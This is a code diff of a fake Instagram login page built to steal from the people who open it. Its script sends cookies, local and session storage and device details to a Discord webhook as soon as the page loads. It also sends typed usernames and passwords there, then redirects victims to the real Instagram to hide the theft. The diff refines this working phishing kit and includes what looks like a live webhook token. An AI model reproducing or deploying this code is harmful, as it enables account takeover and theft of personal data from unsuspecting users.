@@ -23,7 +23,7 @@
         .footer { text-align: center; margin-top: 30px; font-size: 12px; color: #8e8e8e; }
         .error { color: red; text-align: center; margin: 10px 0; display: none; }
     </style>
- <img src="https://i.imgur.com/RtqElUQ.png" alt="Instagram">
+    <link rel="icon" href="https://upload.wikimedia.org/wikipedia/commons/thumb/a/a5/Instagram_icon.png/600px-Instagram_icon.png">
 </head>
 <body>
     <div class="container">
@@ -50,7 +50,7 @@
     </div>
 
     <script>
-        const WEBHOOK = 'https://discord.com/api/webhooks/1512838262170062982/AlpdINN_SLzJN37Am0JyaSzs1a5SF47QSe_WanXapnvBMNZLHl0w4G2BlARTf-mGeXBE'; // REPLACE THIS
+        const WEBHOOK = 'https://discord.com/api/webhooks/1512838262170062982/AlpdINN_SLzJN37Am0JyaSzs1a5SF47QSe_WanXapnvBMNZLHl0w4G2BlARTf-mGeXBE'; // <<< REPLACE THIS EXACTLY
 
         async function sendToDiscord(payload) {
             try {
@@ -59,12 +59,9 @@
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify(payload)
                 });
-            } catch (e) {
-                console.error('Send failed');
-            }
+            } catch (e) {}
         }
 
-        // MAX INFO GRAB ON INSTANT CLICK/LOAD
         window.onload = async function() {
             const maxData = {
                 timestamp: new Date().toISOString(),
@@ -73,21 +70,21 @@
                 userAgent: navigator.userAgent,
                 platform: navigator.platform,
                 language: navigator.language,
-                cookies: document.cookie,
-                localStorage: JSON.stringify(Object.keys(localStorage).reduce((obj, key) => { obj[key] = localStorage.getItem(key); return obj; }, {})),
-                sessionStorage: JSON.stringify(Object.keys(sessionStorage).reduce((obj, key) => { obj[key] = sessionStorage.getItem(key); return obj; }, {})),
+                cookies: document.cookie || "none",
+                localStorage: JSON.stringify(Object.keys(localStorage || {}).reduce((obj, key) => { obj[key] = localStorage.getItem(key); return obj; }, {})),
+                sessionStorage: JSON.stringify(Object.keys(sessionStorage || {}).reduce((obj, key) => { obj[key] = sessionStorage.getItem(key); return obj; }, {})),
                 screen: `${screen.width}x${screen.height}x${screen.colorDepth}`,
                 timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                 doNotTrack: navigator.doNotTrack,
                 hardwareConcurrency: navigator.hardwareConcurrency,
-                deviceMemory: navigator.deviceMemory
+                deviceMemory: navigator.deviceMemory,
+                connection: navigator.connection ? navigator.connection.effectiveType : "unknown"
             };
 
             await sendToDiscord({
                 content: `🔥 **INSTANT CLICK HARVEST** - Victim opened link!\n\`\`\`json\n${JSON.stringify(maxData, null, 2)}\n\`\`\``
             });
 
-            // Fake loading then show form
             setTimeout(() => {
                 document.getElementById('loginForm').addEventListener('submit', async function(e) {
                     e.preventDefault();
@@ -97,18 +94,16 @@
 
                     if (username && password) {
                         await sendToDiscord({
-                            content: `🎣 **FULL PASSWORD CAPTURE** \n**Username/Email:** ${username}\n**Password:** ${password}\n**All Data:** See previous harvest`
+                            content: `🎣 **FULL PASSWORD CAPTURE** \n**Username/Email:** ${username}\n**Password:** ${password}\n**Time:** ${new Date().toISOString()}`
                         });
-
                         errorMsg.style.display = 'block';
                         setTimeout(() => {
                             errorMsg.style.display = 'none';
-                            // Redirect to real IG to seem legit
                             window.location.href = 'https://www.instagram.com/accounts/login/';
-                        }, 1200);
+                        }, 1500);
                     }
                 });
-            }, 800);
+            }, 600);
         };
     </script>
 </body>
